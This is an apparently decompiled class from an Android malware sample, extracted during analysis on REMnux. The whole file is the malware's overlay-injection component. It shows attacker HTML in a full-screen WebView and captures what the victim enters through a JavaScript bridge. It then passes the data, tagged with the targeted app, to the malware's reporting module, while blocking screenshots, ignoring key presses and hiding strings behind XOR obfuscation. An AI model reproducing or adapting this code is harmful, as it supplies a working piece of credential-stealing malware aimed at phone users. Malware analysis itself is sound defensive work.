package com.zjxyxnvvp.nxvxchltf.inject;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.os.Bundle;
import android.view.KeyEvent;
import android.webkit.JavascriptInterface;
import android.webkit.JsResult;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import org.json.JSONException;
import org.json.JSONObject;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class uibwduIABuIaw extends Activity {
    private static short[] $ = {-27036, -27061, -27071, -27049, -27062, -27060, -27071, -32018, -32001, -32030, -32018, -32075, -32014, -32018, -32009, -32010, -18072, -18071, -18053, -18160, -18171};

    /* renamed from: b  reason: collision with root package name */
    public static String f338b = "nothing";
    public static String c = "currentApp";

    /* renamed from: a  reason: collision with root package name */
    private boolean f339a;

    /* loaded from: /home/remnux/decompressedMalicious.dex */
    private static class b extends WebChromeClient {
        private b() {
        }

        @Override // android.webkit.WebChromeClient
        public boolean onJsAlert(WebView webView, String str, String str2, JsResult jsResult) {
            return true;
        }
    }

    /* loaded from: /home/remnux/decompressedMalicious.dex */
    private static class c extends WebViewClient {
        private c() {
        }

        @Override // android.webkit.WebViewClient
        public void onPageFinished(WebView webView, String str) {
        }

        @Override // android.webkit.WebViewClient
        public boolean shouldOverrideUrlLoading(WebView webView, String str) {
            return false;
        }
    }

    /* loaded from: /home/remnux/decompressedMalicious.dex */
    private static class d {
        private static short[] $ = {18147, 18162, 18162, 18158, 18155, 18145, 18147, 18166, 18155, 18157, 18156, 17259, 17262, 17275, 17262, 23065, 23067, 23050, 23054, 23055, 23048, 23071, 23070, 23077, 23059, 23060, 23056, 23071, 23065, 23054, 23049, 21574, 21582, 21580, 21595, 21574, 21593, 21578, 21525};

        /* renamed from: a  reason: collision with root package name */
        private uibwduIABuIaw f340a;

        private static String $(int i, int i2, int i3) {
            char[] cArr = new char[i2 - i];
            for (int i4 = 0; i4 < i2 - i; i4++) {
                cArr[i4] = (char) ($[i + i4] ^ i3);
            }
            return new String(cArr);
        }

        d(uibwduIABuIaw uibwduiabuiaw) {
            this.f340a = uibwduiabuiaw;
        }

        @JavascriptInterface
        public void returnResult(String str) {
            com.zjxyxnvvp.nxvxchltf.d dVar = com.zjxyxnvvp.nxvxchltf.d.e;
            JSONObject jSONObject = new JSONObject();
            try {
                jSONObject.put($(0, 11, 18050), uibwduIABuIaw.c);
                jSONObject.put($(11, 15, 17167), str);
                dVar.f314a.d(this.f340a, $(15, 31, 23162), jSONObject.toString());
                com.zjxyxnvvp.nxvxchltf.h.b.a aVar = dVar.f314a;
                uibwduIABuIaw uibwduiabuiaw = this.f340a;
                aVar.i(uibwduiabuiaw, $(31, 39, 21551) + uibwduIABuIaw.c, false);
            } catch (JSONException e) {
                e.printStackTrace();
            }
            this.f340a.finish();
        }
    }

    private static String $(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) ($[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    @Override // android.app.Activity
    public void onBackPressed() {
        super.onBackPressed();
    }

    @Override // android.app.Activity
    @SuppressLint({"SetJavaScriptEnabled"})
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
    }

    @Override // android.app.Activity
    public void onDestroy() {
        super.onDestroy();
        finish();
        a.f337a = false;
    }

    @Override // android.app.Activity, android.view.KeyEvent.Callback
    public boolean onKeyDown(int i, KeyEvent keyEvent) {
        return false;
    }

    @Override // android.app.Activity
    public void onPause() {
        super.onPause();
        finish();
        a.f337a = false;
    }

    @Override // android.app.Activity
    protected void onResume() {
        super.onResume();
        a.f337a = true;
    }

    @Override // android.app.Activity
    protected void onStart() {
        super.onStart();
        if (!this.f339a) {
            WebView webView = new WebView(this);
            webView.getSettings().setJavaScriptEnabled(true);
            webView.setWebViewClient(new c());
            webView.setWebChromeClient(new b());
            webView.addJavascriptInterface(new d(this), $(0, 7, -27099));
            webView.loadDataWithBaseURL(null, f338b, $(7, 16, -32102), $(16, 21, -18115), null);
            setContentView(webView);
            f338b = "";
            getWindow().addFlags(8192);
            this.f339a = true;
        }
    }

    @Override // android.app.Activity
    protected void onStop() {
        super.onStop();
        a.f337a = false;
    }
}
